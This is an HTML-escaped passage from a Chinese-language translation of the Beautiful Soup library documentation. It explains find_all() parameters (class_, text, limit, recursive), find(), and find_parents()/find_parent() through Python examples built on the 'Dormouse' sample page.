&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;css_soup = BeautifulSoup(&amp;apos;&amp;lt;p class=&amp;quot;body strikeout&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;css_soup.find_all(&amp;quot;p&amp;quot;, class_=&amp;quot;strikeout&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;body strikeout&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;css_soup.find_all(&amp;quot;p&amp;quot;, class_=&amp;quot;body&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;body strikeout&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;搜索 &lt;code&gt;class&lt;/code&gt; 属性时也可以通过CSS值完全匹配:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;css_soup.find_all(&amp;quot;p&amp;quot;, class_=&amp;quot;body strikeout&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;body strikeout&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;完全匹配 &lt;code&gt;class&lt;/code&gt; 的值时,如果CSS类名的顺序与实际不符,将搜索不到结果:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;a&amp;quot;, attrs=&amp;#123;&amp;quot;class&amp;quot;: &amp;quot;sister&amp;quot;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;text-参数&quot;&gt;&lt;a href=&quot;#text-参数&quot; class=&quot;headerlink&quot; title=&quot;text 参数&quot;&gt;&lt;/a&gt;&lt;code&gt;text&lt;/code&gt; 参数&lt;/h3&gt;&lt;p&gt;通过 &lt;code&gt;text&lt;/code&gt; 参数可以搜搜文档中的字符串内容.与 &lt;code&gt;name&lt;/code&gt; 参数的可选值一样, &lt;code&gt;text&lt;/code&gt; 参数接受 &lt;a href=&quot;#id27&quot;&gt;字符串&lt;/a&gt; , &lt;a href=&quot;#id28&quot;&gt;正则表达式&lt;/a&gt; , &lt;a href=&quot;#id29&quot;&gt;列表&lt;/a&gt;, &lt;a href=&quot;#true&quot;&gt;True&lt;/a&gt; . 看例子:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(text=&amp;quot;Elsie&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;Elsie&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(text=[&amp;quot;Tillie&amp;quot;, &amp;quot;Elsie&amp;quot;, &amp;quot;Lacie&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;Elsie&amp;apos;, u&amp;apos;Lacie&amp;apos;, u&amp;apos;Tillie&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(text=re.compile(&amp;quot;Dormouse&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;, u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def is_the_only_string_within_a_tag(s):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;Return True if this string is the only child of its parent tag.&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return (s == s.parent.string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(text=is_the_only_string_within_a_tag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;, u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;, u&amp;apos;Elsie&amp;apos;, u&amp;apos;Lacie&amp;apos;, u&amp;apos;Tillie&amp;apos;, u&amp;apos;...&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;虽然 &lt;code&gt;text&lt;/code&gt; 参数用于搜索字符串,还可以与其它参数混合使用来过滤tag.Beautiful Soup会找到 &lt;code&gt;.string&lt;/code&gt; 方法与 &lt;code&gt;text&lt;/code&gt; 参数值相符的tag.下面代码用来搜索内容里面包含“Elsie”的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;a&amp;quot;, text=&amp;quot;Elsie&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a href=&amp;quot;http://example.com/elsie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;limit-参数&quot;&gt;&lt;a href=&quot;#limit-参数&quot; class=&quot;headerlink&quot; title=&quot;limit 参数&quot;&gt;&lt;/a&gt;&lt;code&gt;limit&lt;/code&gt; 参数&lt;/h3&gt;&lt;p&gt;&lt;code&gt;find_all()&lt;/code&gt; 方法返回全部的搜索结构,如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 &lt;code&gt;limit&lt;/code&gt; 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 &lt;code&gt;limit&lt;/code&gt; 的限制时,就停止搜索返回结果.&lt;/p&gt;
&lt;p&gt;文档树中有3个tag符合搜索条件,但结果只返回了2个,因为我们限制了返回数量:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;a&amp;quot;, limit=2)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;recursive-参数&quot;&gt;&lt;a href=&quot;#recursive-参数&quot; class=&quot;headerlink&quot; title=&quot;recursive 参数&quot;&gt;&lt;/a&gt;&lt;code&gt;recursive&lt;/code&gt; 参数&lt;/h3&gt;&lt;p&gt;调用tag的 &lt;code&gt;find_all()&lt;/code&gt; 方法时,Beautiful Soup会检索当前tag的所有子孙节点,如果只想搜索tag的直接子节点,可以使用参数 &lt;code&gt;recursive=False&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;一段简单的文档:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   The Dormouse&amp;apos;s story&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;是否使用 &lt;code&gt;recursive&lt;/code&gt; 参数的搜索结果:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.html.find_all(&amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.html.find_all(&amp;quot;title&amp;quot;, recursive=False)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# []&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;像调用-find-all-一样调用tag&quot;&gt;&lt;a href=&quot;#像调用-find-all-一样调用tag&quot; class=&quot;headerlink&quot; title=&quot;像调用 find_all() 一样调用tag&quot;&gt;&lt;/a&gt;像调用 &lt;code&gt;find_all()&lt;/code&gt; 一样调用tag&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find_all()&lt;/code&gt; 几乎是Beautiful Soup中最常用的搜索方法,所以我们定义了它的简写方法. &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象和 &lt;code&gt;tag&lt;/code&gt; 对象可以被当作一个方法来使用,这个方法的执行结果与调用这个对象的 &lt;code&gt;find_all()&lt;/code&gt; 方法相同,下面两行代码是等价的:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这两行代码也是等价的:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.title.find_all(text=True)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.title(text=True)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;find&quot;&gt;&lt;a href=&quot;#find&quot; class=&quot;headerlink&quot; title=&quot;find()&quot;&gt;&lt;/a&gt;find()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_all()&lt;/code&gt; 方法将返回文档中符合条件的所有tag,尽管有时候我们只想得到一个结果.比如文档中只有一个&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;标签,那么使用 &lt;code&gt;find_all()&lt;/code&gt; 方法来查找&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;标签就不太合适, 使用 &lt;code&gt;find_all&lt;/code&gt; 方法并设置 &lt;code&gt;limit=1&lt;/code&gt; 参数不如直接使用 &lt;code&gt;find()&lt;/code&gt; 方法.下面两行代码是等价的:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;apos;title&amp;apos;, limit=1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find(&amp;apos;title&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;唯一的区别是 &lt;code&gt;find_all()&lt;/code&gt; 方法的返回结果是值包含一个元素的列表,而 &lt;code&gt;find()&lt;/code&gt; 方法直接返回结果.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_all()&lt;/code&gt; 方法没有找到目标是返回空列表, &lt;code&gt;find()&lt;/code&gt; 方法找不到目标时,返回 &lt;code&gt;None&lt;/code&gt; .&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(soup.find(&amp;quot;nosuchtag&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;soup.head.title&lt;/code&gt; 是 &lt;a href=&quot;#id17&quot;&gt;tag的名字&lt;/a&gt; 方法的简写.这个简写的原理就是多次调用当前tag的 &lt;code&gt;find()&lt;/code&gt; 方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.head.title&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find(&amp;quot;head&amp;quot;).find(&amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;find-parents-和-find-parent&quot;&gt;&lt;a href=&quot;#find-parents-和-find-parent&quot; class=&quot;headerlink&quot; title=&quot;find_parents() 和 find_parent()&quot;&gt;&lt;/a&gt;find_parents() 和 find_parent()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find_parents( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_parent( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们已经用了很大篇幅来介绍 &lt;code&gt;find_all()&lt;/code&gt; 和 &lt;code&gt;find()&lt;/code&gt; 方法,Beautiful Soup中还有10个用于搜索的API.它们中的五个用的是与 &lt;code&gt;find_all()&lt;/code&gt; 相同的搜索参数,另外5个与 &lt;code&gt;find()&lt;/code&gt; 方法的搜索参数类似.区别仅是它们搜索文档的不同部分.&lt;/p&gt;
&lt;p&gt;记住: &lt;code&gt;find_all()&lt;/code&gt; 和 &lt;code&gt;find()&lt;/code&gt; 只搜索当前节点的所有子节点,孙子节点等. &lt;code&gt;find_parents()&lt;/code&gt; 和 &lt;code&gt;find_parent()&lt;/code&gt; 用来搜索当前节点的父辈节点,搜索方法与普通tag的搜索方法相同,搜索文档搜索文档包含的内容. 我们从一个文档中的一个叶子节点开始:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;a_string = soup.find(text=&amp;quot;Lacie&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Lacie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_string.find_parents(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_string.find_parent(&amp;quot;p&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;Once upon a time there were three little sisters; and their names were&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  and they lived at the bottom of a well.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a_string.find_parents(&amp;quot;p&amp;quot;, class=&amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# []&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;文档中的一个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签是是当前叶子节点的直接父节点,所以可以被找到.还有一个&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签,是目标叶子节点的间接父辈节点,所以也可以被找到.包含class值为”title”的&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签不是不是目标叶子节点的父辈节点,所以通过 &lt;code&gt;find_parents()&lt;/code&gt; 方法搜索不到.&lt;/p&gt;
